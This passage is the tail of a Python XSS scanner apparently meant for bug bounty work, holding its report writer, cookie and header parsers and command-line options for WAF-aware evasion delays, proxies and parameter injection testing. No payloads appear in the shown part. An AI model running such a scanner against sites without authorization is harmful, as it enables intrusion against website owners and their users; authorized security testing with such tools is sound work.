                    'waf_aware': self.waf_aware,
                    'request_count': getattr(self, 'request_count', 0),
                    'vulnerabilities': successful_xss,
                    'potential_vulnerabilities': potential_xss,
                    'all_results': getattr(self, 'results', [])
                }, f, indent=2, ensure_ascii=False)
            
            logger.info(f"Test results saved to: {output_file}")
            logger.info(f"JSON results saved to: {json_file}")
            return
        
        
        
        output_file = output_path / f"{safe_domain}_{timestamp}.txt"
        
        with open(output_file, 'w', encoding='utf-8') as f:
            f.write("=" * 80 + "\n")
            f.write(f"PARAMETER & SENSITIVE JS EXTRACTION REPORT\n")
            f.write("=" * 80 + "\n\n")
            f.write(f"Domain: {domain}\n")
            f.write(f"Target URL: {self.target_url}\n")
            f.write(f"Scan Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write(f"Total URLs Discovered: {len(getattr(self, 'crawler_visited_urls', []))}\n")
            f.write(f"Total Parameters Discovered: {len(getattr(self, 'crawler_discovered_parameters', set()))}\n")
            reflected_params = getattr(self, 'crawler_reflected_parameters', {})
            f.write(f"Reflected Parameters: {len(reflected_params)} ⚠ HIGH PRIORITY\n")
            f.write(f"Total Sensitive JS Sinks: {len(getattr(self, 'crawler_sensitive_js', []))}\n\n")
            
            
            if reflected_params:
                f.write("=" * 80 + "\n")
                f.write("⚠ REFLECTED PARAMETERS (HIGH PRIORITY FOR XSS TESTING) ⚠\n")
                f.write("=" * 80 + "\n\n")
                for param in sorted(reflected_params.keys()):
                    reflection_data = reflected_params[param]
                    f.write(f"✓ {param} - Reflected in {len(reflection_data)} URL(s):\n")
                    for ref_data in reflection_data[:3]:  
                        f.write(f"  - {ref_data['url']}\n")
                        f.write(f"    → Reflected in: {', '.join(ref_data['reflected_in'])}\n")
                    if len(reflection_data) > 3:
                        f.write(f"  ... and {len(reflection_data) - 3} more URL(s)\n")
                    f.write("\n")
                f.write("\n")
            
            
            f.write("=" * 80 + "\n")
            f.write("DISCOVERED PARAMETERS\n")
            f.write("=" * 80 + "\n\n")
            discovered_params = getattr(self, 'crawler_discovered_parameters', set())
            parameter_urls = getattr(self, 'crawler_parameter_urls', {})
            
            reflected_parameters = getattr(self, 'crawler_reflected_parameters', {})
            
            if discovered_params:
                for param in sorted(discovered_params):
                    
                    is_reflected = param in reflected_parameters
                    reflection_flag = " [REFLECTED ✓]" if is_reflected else ""
                    
                    f.write(f"Parameter: {param}{reflection_flag}\n")
                    
                    
                    if is_reflected:
                        reflection_data = reflected_parameters[param]
                        f.write(f"  Reflection Status: REFLECTED in {len(reflection_data)} URL(s)\n")
                        for ref_data in reflection_data:
                            f.write(f"    - URL: {ref_data['url']}\n")
                            f.write(f"      Reflected in: {', '.join(ref_data['reflected_in'])}\n")
                            if ref_data.get('context'):
                                context = ref_data['context'][:150]
                                f.write(f"      Context: ...{context}...\n")
                        f.write("\n")
                    
                    urls_for_param = parameter_urls.get(param, set())
                    if urls_for_param:
                        f.write(f"  Found in {len(urls_for_param)} URL(s):\n")
                        for url in sorted(urls_for_param):
                            
                            parsed = urlparse(url)
                            path = parsed.path or '/'
                            if parsed.query:
                                
                                existing_params = parse_qs(parsed.query)
                                if param in existing_params:
                                    f.write(f"    - {url}\n")
                                else:
                                    
                                    base_url = f"{parsed.scheme}://{parsed.netloc}{path}"
                                    f.write(f"    - {base_url}?{param}=VALUE\n")
                                    f.write(f"      (or add to: {url})\n")
                            else:
                                
                                f.write(f"    - {url}?{param}=VALUE\n")
                    else:
                        f.write(f"  No specific URLs found (discovered from JavaScript/forms)\n")
                        
                        visited_urls = getattr(self, 'crawler_visited_urls', set())
                        if visited_urls:
                            
                            example_urls = list(visited_urls)[:3]
                            f.write(f"  Suggested test URLs:\n")
                            for test_url in example_urls:
                                parsed = urlparse(test_url)
                                separator = '&' if '?' in test_url else '?'
                                f.write(f"    - {test_url}{separator}{param}=VALUE\n")
                    f.write("\n")
            else:
                f.write("  No parameters discovered.\n")
            f.write("\n")
            
            
            f.write("=" * 80 + "\n")
            f.write("DISCOVERED URLs\n")
            f.write("=" * 80 + "\n\n")
            visited_urls = getattr(self, 'crawler_visited_urls', set())
            if visited_urls:
                for url in sorted(visited_urls):
                    f.write(f"  - {url}\n")
            else:
                f.write("  No URLs discovered.\n")
            f.write("\n")
            
            
            f.write("=" * 80 + "\n")
            f.write("SENSITIVE JAVASCRIPT SINKS/SOURCES\n")
            f.write("=" * 80 + "\n\n")
            sensitive_js = getattr(self, 'crawler_sensitive_js', [])
            if sensitive_js:
                
                by_type = {}
                for js_finding in sensitive_js:
                    js_type = js_finding.get('type', 'unknown')
                    if js_type not in by_type:
                        by_type[js_type] = []
                    by_type[js_type].append(js_finding)
                
                for js_type, findings in sorted(by_type.items()):
                    f.write(f"\n{'-' * 80}\n")
                    f.write(f"Type: {js_type} ({len(findings)} occurrences)\n")
                    f.write(f"{'-' * 80}\n\n")
                    for i, js_finding in enumerate(findings, 1):
                        f.write(f"  Finding #{i}:\n")
                        f.write(f"    URL: {js_finding.get('url', 'N/A')}\n")
                        snippet = js_finding.get('snippet', 'N/A')
                        if snippet and snippet != 'N/A':
                            
                            snippet_lines = snippet.split('\n')
                            if len(snippet_lines) > 5:
                                snippet = '\n'.join(snippet_lines[:5]) + '\n    ... (truncated)'
                            f.write(f"    Snippet:\n")
                            for line in snippet.split('\n'):
                                f.write(f"      {line}\n")
                        else:
                            f.write(f"    Snippet: {snippet}\n")
                        f.write("\n")
            else:
                f.write("  No sensitive JavaScript sinks/sources found.\n")
            f.write("\n")
            
            f.write("=" * 80 + "\n")
            f.write("END OF REPORT\n")
            f.write("=" * 80 + "\n")
        
        logger.info(f"Extraction results saved to: {output_file}")
        logger.info(f"  - Parameters: {len(discovered_params)}")
        logger.info(f"  - URLs: {len(visited_urls)}")
        logger.info(f"  - Sensitive JS sinks: {len(sensitive_js)}")
        
        
        json_file = output_path / f"{safe_domain}_{timestamp}.json"
        parameter_urls = getattr(self, 'crawler_parameter_urls', {})
        
        
        parameters_with_urls = {}
        for param in discovered_params:
            urls_for_param = sorted(list(parameter_urls.get(param, set())))
            parameters_with_urls[param] = urls_for_param
        
        
        reflected_parameters = getattr(self, 'crawler_reflected_parameters', {})
        
        with open(json_file, 'w', encoding='utf-8') as f:
            json.dump({
                'domain': domain,
                'target_url': self.target_url,
                'scan_date': datetime.now().isoformat(),
                'urls_discovered': sorted(list(visited_urls)),
                'parameters_discovered': sorted(list(discovered_params)),
                'parameters_with_urls': parameters_with_urls,  
                'reflected_parameters': reflected_parameters,  
                'sensitive_js': sensitive_js
            }, f, indent=2, ensure_ascii=False)
        
        logger.info(f"JSON results saved to: {json_file}")


def parse_cookies(cookie_input: str) -> List[Dict]:
    """
    Parse cookies from various formats:
    - JSON file: {"cookies": [{"name": "session", "value": "abc123"}]}
    - Netscape format file
    - Raw string: "name1=value1; name2=value2"
    - JSON string: '[{"name": "session", "value": "abc123"}]'
    """
    cookies = []
    
    if not cookie_input:
        return cookies
    
    cookie_path = Path(cookie_input)
    
    
    if cookie_path.exists() and cookie_path.is_file():
        try:
            
            with open(cookie_path, 'r') as f:
                content = f.read().strip()
                
                try:
                    data = json.loads(content)
                    if isinstance(data, list):
                        cookies = data
                    elif isinstance(data, dict) and 'cookies' in data:
                        cookies = data['cookies']
                    elif isinstance(data, dict):
                        
                        if 'name' in data and 'value' in data:
                            cookies = [data]
                except json.JSONDecodeError:
                    
                    cookies = _parse_netscape_cookies(content)
        except Exception as e:
            logger.error(f"Error parsing cookie file {cookie_input}: {e}")
            return cookies
    else:
        
        try:
            
            data = json.loads(cookie_input)
            if isinstance(data, list):
                cookies = data
            elif isinstance(data, dict) and 'cookies' in data:
                cookies = data['cookies']
            elif isinstance(data, dict) and 'name' in data and 'value' in data:
                cookies = [data]
        except json.JSONDecodeError:
            
            cookie_pairs = cookie_input.split(';')
            for pair in cookie_pairs:
                pair = pair.strip()
                if '=' in pair:
                    name, value = pair.split('=', 1)
                    cookies.append({
                        'name': name.strip(),
                        'value': value.strip()
                    })
    
    return cookies


def _parse_netscape_cookies(content: str) -> List[Dict]:
    """Parse Netscape format cookies"""
    cookies = []
    lines = content.split('\n')
    
    for line in lines:
        line = line.strip()
        if not line or line.startswith('#'):
            continue
        
        
        parts = line.split('\t')
        if len(parts) >= 7:
            cookies.append({
                'name': parts[5],
                'value': parts[6],
                'domain': parts[0],
                'path': parts[2],
                'secure': parts[3] == 'TRUE',
            })
    
    return cookies


def parse_headers(header_input: str) -> Dict[str, str]:
    """
    Parse headers from various formats:
    - JSON file: {"Authorization": "Bearer token", "X-API-Key": "key"}
    - Header file (one per line): "Authorization: Bearer token"
    - Raw string: "Authorization: Bearer token\\nX-API-Key: key"
    - JSON string: '{"Authorization": "Bearer token"}'
    """
    headers = {}
    
    if not header_input:
        return headers
    
    header_path = Path(header_input)
    
    
    if header_path.exists() and header_path.is_file():
        try:
            with open(header_path, 'r') as f:
                content = f.read().strip()
                
                try:
                    headers = json.loads(content)
                    if not isinstance(headers, dict):
                        raise ValueError("Headers must be a JSON object")
                except json.JSONDecodeError:
                    
                    headers = _parse_header_lines(content)
        except Exception as e:
            logger.error(f"Error parsing header file {header_input}: {e}")
            return headers
    else:
        
        try:
            
            headers = json.loads(header_input)
            if not isinstance(headers, dict):
                raise ValueError("Headers must be a JSON object")
        except json.JSONDecodeError:
            
            headers = _parse_header_lines(header_input)
    
    return headers


def _parse_header_lines(content: str) -> Dict[str, str]:
    """Parse headers from line-by-line format"""
    headers = {}
    lines = content.split('\n')
    
    for line in lines:
        line = line.strip()
        if not line:
            continue
        
        if ':' in line:
            name, value = line.split(':', 1)
            headers[name.strip()] = value.strip()
    
    return headers


async def main():
    """Main function"""
    parser = ArgumentParser(description="Professional XSS Scanner for Bug Bounty Hunting - WAF-aware")
    parser.add_argument("url", nargs='?', help="Target URL to scan (optional if using --proxy with --test-proxy)")
    parser.add_argument("-d", "--depth", type=int, default=2, help="Maximum crawling depth (default: 2)")
    parser.add_argument("-p", "--pages", type=int, default=50, help="Maximum pages to crawl (default: 50)")
    parser.add_argument("--headless", action="store_true", default=True, help="Run in headless mode (default: True)")
    parser.add_argument("--no-headless", action="store_false", dest="headless", help="Run with browser visible")
    parser.add_argument("-o", "--output", default="results", help="Output directory (default: results)")
    parser.add_argument("-t", "--timeout", type=int, default=30000, help="Request timeout in ms (default: 30000)")
    parser.add_argument("--waf-aware", action="store_true", default=True, help="Use WAF-aware mode (default: True)")
    parser.add_argument("--no-waf-aware", action="store_false", dest="waf_aware", help="Disable WAF-aware mode")
    parser.add_argument("--min-delay", type=float, default=1.0, help="Minimum random delay between requests in seconds (default: 1.0)")
    parser.add_argument("--max-delay", type=float, default=3.0, help="Maximum random delay between requests in seconds (default: 3.0)")
    parser.add_argument("--request-delay", type=float, default=2.0, help="Base delay between requests in seconds (default: 2.0)")
    parser.add_argument("--max-retries", type=int, default=3, help="Maximum retries for failed requests (default: 3)")
    parser.add_argument("--cookies", type=str, help="Cookies for authentication. Can be: (1) Path to JSON file, (2) Path to Netscape cookie file, (3) Raw cookie string 'name1=value1; name2=value2', (4) JSON string '[{\"name\": \"session\", \"value\": \"abc123\"}]'")
    parser.add_argument("--headers", type=str, help="Custom headers for authentication. Can be: (1) Path to JSON file, (2) Path to header file (one per line), (3) Raw header string 'Header: value', (4) JSON string '{\"Authorization\": \"Bearer token\"}'")
    parser.add_argument("--cookie-file", type=str, help="Path to cookie file (alias for --cookies)")
    parser.add_argument("--header-file", type=str, help="Path to header file (alias for --headers)")
    parser.add_argument("--proxy", type=str, help="Proxy server URL. Supports SOCKS5, HTTP, and HTTPS. Formats: 'socks5://proxy.example.com:1080', 'socks5://user:pass@proxy.example.com:1080', 'http://proxy.example.com:8080', 'http://user:pass@proxy.example.com:8080'")
    parser.add_argument("--test-proxy", action="store_true", help="Test proxy connectivity before starting scan")
    parser.add_argument("--test-mode", action="store_true", help="Enable test mode: Test XSS vulnerabilities on parameters without crawling. Use with --parameters to test specific parameters, or test all parameters found in URL.")
    parser.add_argument("--parameters", "-P", type=str, help="Comma-separated list of parameter names to test (only in test mode). If not specified, all parameters in URL will be tested. Example: --parameters id,name,search")
    
    args = parser.parse_args()
    
    
    if args.test_proxy and not args.proxy:
        logger.error("--test-proxy requires --proxy to be specified")
        sys.exit(1)
    
    
    if args.url:
        if not args.url.startswith(('http://', 'https://')):
            args.url = 'https://' + args.url
    elif not (args.proxy and args.test_proxy):
        
        parser.error("url argument is required unless using --proxy with --test-proxy")
    
    
    parameters = None
    if args.parameters:
        parameters = [p.strip() for p in args.parameters.split(',') if p.strip()]
        if not parameters:
            logger.warning("--parameters provided but no valid parameters found. Testing all parameters in URL.")
    
    
    if args.parameters and not args.test_mode:
        logger.warning("--parameters is only used in test mode. Use --test-mode to enable test mode.")
    
    
    cookies = []
    cookie_input = args.cookies or args.cookie_file
    if cookie_input:
        cookies = parse_cookies(cookie_input)
        if cookies:
            logger.info(f"Parsed {len(cookies)} cookies from input")
        else:
            logger.warning("No cookies were parsed from input")
    
    
    headers = {}
    header_input = args.headers or args.header_file
    if header_input:
        headers = parse_headers(header_input)
        if headers:
            logger.info(f"Parsed {len(headers)} custom headers from input")
        else:
            logger.warning("No headers were parsed from input")
    
    
    if args.proxy and args.test_proxy and not args.url:
        
        logger.info("Proxy test mode - no URL required")
        scanner = XSSScanner(
            target_url="https://example.com",  
            proxy=args.proxy,
            headless=args.headless
        )
        try:
            success = await scanner.test_proxy()
            sys.exit(0 if success else 1)
        except KeyboardInterrupt:
            logger.info("Proxy test interrupted by user")
            sys.exit(1)
        except Exception as e:
            logger.error(f"Fatal error: {e}", exc_info=True)
            sys.exit(1)
    
    
    scanner = XSSScanner(
        target_url=args.url,
        max_depth=args.depth,
        max_pages=args.pages,
        headless=args.headless,
        timeout=args.timeout,
        waf_aware=args.waf_aware,
        min_delay=args.min_delay,
        max_delay=args.max_delay,
        request_delay=args.request_delay,
        max_retries=args.max_retries,
        cookies=cookies,
        headers=headers,
        proxy=args.proxy
    )
    
    try:
        
        if args.test_mode:
            
            await scanner.test_parameters(parameters=parameters, test_proxy_first=args.test_proxy)
            
            
            if hasattr(scanner, 'results') and scanner.results:
                scanner.save_results(args.output)
                logger.info(f"Test results saved to: {args.output}/")
        else:
            
            await scanner.scan(test_proxy_first=args.test_proxy)
            
            
            scanner.save_results(args.output)
            
            
            print("\n" + "=" * 80)
            print("EXTRACTION SUMMARY")
            print("=" * 80)
            print(f"Target URL: {args.url}")
            discovered_params = getattr(scanner, 'crawler_discovered_parameters', set())
            visited_urls = getattr(scanner, 'crawler_visited_urls', set())
            sensitive_js = getattr(scanner, 'crawler_sensitive_js', [])
            print(f"URLs Discovered: {len(visited_urls)}")
            print(f"Parameters Discovered: {len(discovered_params)}")
            print(f"Sensitive JS Sinks: {len(sensitive_js)}")
            print(f"Results saved to: {args.output}/")
            print("=" * 80 + "\n")
        
    except KeyboardInterrupt:
        logger.info("Operation interrupted by user")
        if hasattr(scanner, 'results') and scanner.results:
            scanner.save_results(args.output)
        sys.exit(1)
    except Exception as e:
        logger.error(f"Fatal error: {e}", exc_info=True)
        sys.exit(1)


if __name__ == "__main__":
    asyncio.run(main())
